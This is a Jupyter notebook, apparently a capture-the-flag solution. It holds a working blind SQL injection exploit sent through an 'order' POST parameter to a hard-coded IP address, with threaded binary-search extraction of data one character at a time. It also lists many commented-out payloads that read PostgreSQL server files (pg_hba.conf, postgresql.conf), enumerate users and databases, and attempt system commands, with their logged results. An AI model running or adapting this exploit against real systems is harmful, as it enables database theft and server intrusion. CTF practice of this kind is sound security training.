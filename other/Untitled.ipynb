{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "import re\n",
    "from bs4 import BeautifulSoup\n",
    "import string\n",
    "from IPython.core.display import display, HTML\n",
    "import concurrent.futures\n",
    "import functools\n",
    "from collections import defaultdict\n",
    "\n",
    "url = \"http://200.136.213.109/\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def true_or_false(html):\n",
    "    return html.index('Owl') < html.index('Fraga')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def request_sqli(query, char, compare='='):\n",
    "    if isinstance(char, str):\n",
    "        char = ord(char)\n",
    "        \n",
    "    data = {\n",
    "#         \"order\" : f\"\"\"CASE WHEN (\n",
    "#             SELECT ASCII(SUBSTRING(cast('id' AS text), %d, 1)) \n",
    "#             FROM solutions.bloodsuckers.models.Criminal \n",
    "#             WHERE age=55)%s%d THEN crime ELSE name END\"\"\" % (index, compare, char)\n",
    "#         \"order\" : \"\"\"CASE WHEN (\n",
    "#         SELECT ASCII(SUBSTRING(column_name, %d, 1))\n",
    "#         FROM information_schemav.columns\n",
    "#         WHERE table_name  = 'Criminal' AND ROWNUM = 1)=%d THEN crime ELSE name END\"\"\" % (index, ord(char))\n",
    "        # age- Frage\n",
    "        # crime - Owl\n",
    "        \"order\" : f\"CASE WHEN ({query}){compare}{char} THEN crime ELSE name END\"\n",
    "    }\n",
    "\n",
    "    response = requests.post(url, data=data)\n",
    "    \n",
    "    if 'Owl' not in response.text:\n",
    "        raise Exception(response.text)\n",
    "        \n",
    "    result = true_or_false(response.text)    \n",
    "    \n",
    "    return result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def sqli_brute():\n",
    "    for index in range(1, 100):\n",
    "        for char in string.ascii_letters + string.digits:\n",
    "#             print(f'DEBUG - Index: {index}, Char: {char}')\n",
    "            if request_sqli(char, index):\n",
    "                print(f'FOUND: Index: {index}, Char: {char}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def binsearch(query, index, sl,sh):\n",
    "    searchlow = sl\n",
    "    searchhigh = sh\n",
    "    searchmid = 0\n",
    "    smallest_reached = False\n",
    "    \n",
    "    while True:\n",
    "        searchmid = int((searchlow + searchhigh) / 2)\n",
    "#         print(f\"CURRENT SEARCH: {index} - {searchmid}\")\n",
    "        \n",
    "        if request_sqli(query.format(index=index), searchmid, \"=\"):\n",
    "#             print(f\"Found: {index} - {searchmid}\")\n",
    "            break\n",
    "        elif request_sqli(query.format(index=index), searchmid, \">\"):\n",
    "#             print(f\"BIGGER THAN: {index} - {searchmid}\")\n",
    "            searchlow = searchmid + 1\n",
    "        elif request_sqli(query.format(index=index), searchmid, \"<\"):\n",
    "#             print(f\"SMALLER THAN: {index} - {searchmid}\")\n",
    "            searchhigh = searchmid\n",
    "            \n",
    "            if smallest_reached:\n",
    "                return None\n",
    "            elif searchmid == sl:\n",
    "                smallest_reached = True\n",
    "    \n",
    "    return searchmid\n",
    "\n",
    "\n",
    "\n",
    "def sqli_bin_search(query, min_val, max_val, max_index):\n",
    "    # 32 - 126 - Ascii printable range\n",
    "#     for index in range(1, max_index):\n",
    "# #         print('Current index: ', index)\n",
    "#         curr_char = binsearch(query, index, min_val, max_val)\n",
    "#         if curr_char:\n",
    "#             char = chr(curr_char)\n",
    "#             yield char\n",
    "#             print(f'FOUND: Index: {index}, Char: {char}')\n",
    "#         else:\n",
    "#             print(\"End of field.\")\n",
    "#             return\n",
    "    index_chars = defaultdict(None)\n",
    "    \n",
    "    with concurrent.futures.ThreadPoolExecutor() as executer:\n",
    "#         map_result = tuple(executer.map(binsearch, (query, range(1, max_index), min_val, max_val)))\n",
    "        future_to_index = {executer.submit(binsearch, query, index, min_val, max_val): index for index in  range(1, max_index)}\n",
    "    \n",
    "        for future in concurrent.futures.as_completed(future_to_index):\n",
    "            index = future_to_index[future]\n",
    "            \n",
    "            try:\n",
    "                curr_char = future.result()\n",
    "                \n",
    "                if curr_char:\n",
    "                    char = chr(curr_char)\n",
    "                    print(f'FOUND: Index: {index}, Char: {char}')\n",
    "                    index_chars[index] = char \n",
    "            except Exception as exc:\n",
    "                print('%r generated an exception: %s' % (index, exc))\n",
    "                \n",
    "            else:\n",
    "                print(\"Current index: \", index)\n",
    "\n",
    "        \n",
    "    return index_chars"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "query_len = \"\"\"\n",
    "            SELECT ASCII(SUBSTRING(cast(LENGTH(cast('id' AS text)) as text ), {index}, 1))\n",
    "            FROM   solutions.bloodsuckers.models.Criminal \n",
    "            WHERE  age=55\n",
    "            \"\"\"\n",
    "query_val = \"\"\"\n",
    "            SELECT ASCII(SUBSTRING(cast(id AS text), {index}, 1)) \n",
    "            FROM   solutions.bloodsuckers.models.Criminal \n",
    "            WHERE  age=55\n",
    "            \"\"\"\n",
    "\n",
    "query_val = \"\"\"\n",
    "            SELECT ASCII(SUBSTRING(cast(id AS text), {index}, 1)) \n",
    "            FROM   solutions.bloodsuckers.models.Criminal \n",
    "            where id=1\n",
    "            \"\"\"\n",
    "\n",
    "base_query = \"\"\"\n",
    "            SELECT ASCII(SUBSTRING(%s, {index}, 1)) \n",
    "            \"\"\"\n",
    "\n",
    "#     length = list(sqli_bin_search(query_len, 48, 57, 10))\n",
    "#     print(length)\n",
    "#     length = int(''.join(length))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "base_query = \"\"\"\n",
    "            SELECT ASCII(SUBSTRING(%s, {index}, 1)) \n",
    "            FROM   Criminal\n",
    "            WHERE id=1\n",
    "            \"\"\"\n",
    "\n",
    "# base_query = \"\"\"\n",
    "#             SELECT %s\n",
    "#             FROM   Criminal\n",
    "#             WHERE id=1\n",
    "#             \"\"\"\n",
    "\n",
    "# base_query = \"\"\"\n",
    "#             SELECT ASCII(SUBSTRING(%s, {index}, 1)) \n",
    "#             FROM   Flag\n",
    "#             where id=1\n",
    "#             \"\"\"\n",
    "\n",
    "\n",
    "# base_query = \"\"\"\n",
    "#             SELECT ASCI(\n",
    "#                 SUBSTRING(string_agg(usename, ','), {index}, 1)) \n",
    "#             FROM   pg_user\n",
    "#             \"\"\"\n",
    "\n",
    "# query_val = base_query % \"USER\" #dbuser\n",
    "# query_val = base_query % \"current_database()\" #criminals\n",
    "# query_val = base_query % \"current_setting('data_directory')\" #/var/lib/postgresql/data\n",
    "# query_val = base_query % \"\" #/var/lib/postgresql/data\n",
    "# query_val = base_query % \"pg_read_file('global/pg_auth',0,10000000)\"\n",
    "# query_val = base_query % \"(SELECT string_add(pg_read_file('global/pg_hba.conf',0,10000000), ','))\"\n",
    "# query_val = base_query % \"\"\"(SELECT string_agg(c.relname, ',')\n",
    "# FROM pg_catalog.pg_class c \n",
    "# LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace \n",
    "# WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') \n",
    "# AND pg_catalog.pg_table_is_visible(c.oid))\"\"\" #pg_catalog.pg_class is not mapped\n",
    "# query_val = base_query % \"(SELECT string_agg(username, ',') from pg_user)\"  #pg_user is not mapped\n",
    "# query_val = base_query % \"(SELECT string_agg(datname, ',') FROM pg_database)\"  #pg_database is not mapped \n",
    "# query_val = base_query % \"current_setting('hba_file')\" #/var/lib/postgresql/data/pg_hba.conf\n",
    "# query_val = base_query % \"(STRING_AGG(LOAD_FILE('/var/lib/postgresql/data/pg_hba.conf'), ','))\" #load_file(unknown) does not exist\n",
    "# query_val = base_query % \"(SELECT string_agg(pg_read_file('pg_auth.conf',0,10000000), ','))\" #\n",
    "# query_val = base_query % \"(SELECT USER)\" #\n",
    "# query_val = base_query % \"string_agg(CAST(id as text), ',')\" # get all ids from table, 1,2,3,4. there is nothing...\n",
    "# query_val = base_query % \"(SELECT string_agg(id,'') FROM pg_database)\" #\n",
    "# query_val = base_query % \"current_user\" #\n",
    "# query_val = base_query % \"(SELECT usename FROM pg_shadow)\" #pg_shadow is not mapped \n",
    "# query_val = base_query % \"CAST(inet_server_addr() as text)\" #172.18.0.2/32 , tried to connect remotliy but without success\n",
    "# query_val = base_query % \"CAST(inet_server_port() as text)\"  #5432\n",
    "# query_val = base_query % \"pg_read_file('pg_hba.conf')\"  # # PostgreSQL Client Authentication Configuration File\n",
    "# query_val = base_query % \"pg_read_file('global/ph_auth')\"  # \"global/ph_auth\": No such file or directory\n",
    "# query_val = base_query % \"pg_read_file('global/pg_database')\"  #  ERROR: could not stat file \"global/pg_database\": No such file or directory\n",
    "# query_val = base_query % \"pg_read_file('global')\"  #  could not read file \"global\": Is a directory\n",
    "# query_val = base_query % \"CAST(system('uptime') as text)\"  #   ERROR: cannot accept a value of type internal\n",
    "# query_val = base_query % \"pg_read_file('hibernate.cfg.xml')\"  #ERROR: could not stat file \"global/hibernate.cfg.xml\": No such file or directory\n",
    "# query_val = base_query % \"current_setting('port')\"  #5432\n",
    "# query_val = base_query % \"current_setting('config_file')\"  #/var/lib/postgresql/data/postgresql.conf\n",
    "# query_val = base_query % \"(cast(length(cast(pg_read_file('postgresql.conf') as text)), text)\"  # ----------------------------- PostgreSQL configuration file\n",
    "# query_val = base_query % \"to_char(STRPOS(pg_read_file('postgresql.conf'), 'CTF'), '9999')\"  # No data type for node\n",
    "# query_val = base_query % \"(string_agg(pg_ls_dir('.'),','))\"  # No data type for node\n",
    "# query_val = base_query % \"STRPOS(pg_read_file('pg_hba.conf'), '')\"  # No data type for node\n",
    "# query_val = base_query % \"(SELECT string_agg(id, ',') FROM Criminal)\"  # No data type for node\n",
    "# strpos('w3resource', 'w344')\n",
    "# query_val = \"create table file (line text)\"\n",
    "\n",
    "\n",
    "# request_sqli(query_val, 0)\n",
    "\n",
    "# try:\n",
    "#     result = sqli_bin_search(query_val, 0, 126, 10)\n",
    "    \n",
    "# #     print(''.join(word))\n",
    "# except Exception as ex:\n",
    "#     display(HTML(str(ex)))\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 250,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# list columns\n",
    "# SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 251,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# list dbs\n",
    "# SELECT datname FROM pg_database\n",
    "\n",
    "# current user\n",
    "# select user\n",
    "\n",
    "# list users\n",
    "# SELECT usename FROM pg_user\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'PostgreSQL 9.6.5 on x86_64-pc-linux-gnu, compiled by gcc (Debian 4.9.2-10) 4.9.2, 64-bit'"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "''.join(['P', 'o', 's', 't', 'g', 'r', 'e', 'S', 'Q', 'L', ' ', '9', '.', '6', '.', '5', ' ', 'o', 'n', ' ', 'x', '8', '6', '_', '6', '4', '-', 'p', 'c', '-', 'l', 'i', 'n', 'u', 'x', '-', 'g', 'n', 'u', ',', ' ', 'c', 'o', 'm', 'p', 'i', 'l', 'e', 'd', ' ', 'b', 'y', ' ', 'g', 'c', 'c', ' ', '(', 'D', 'e', 'b', 'i', 'a', 'n', ' ', '4', '.', '9', '.', '2', '-', '1', '0', ')', ' ', '4', '.', '9', '.', '2', ',', ' ', '6', '4', '-', 'b', 'i', 't'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"pg_ls_dir('.')), 1, 1)) \""
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"\"\"SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by CASE WHEN (\n",
    "            SELECT ASCII(SUBSTRING((select string_agg(pg_ls_dir, ',') from pg_ls_dir('.')), 1, 1)) \n",
    "            FROM   Criminal\n",
    "            )=63 THEN crime ELSE name END]\"\"\".splitlines()[1][75:]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
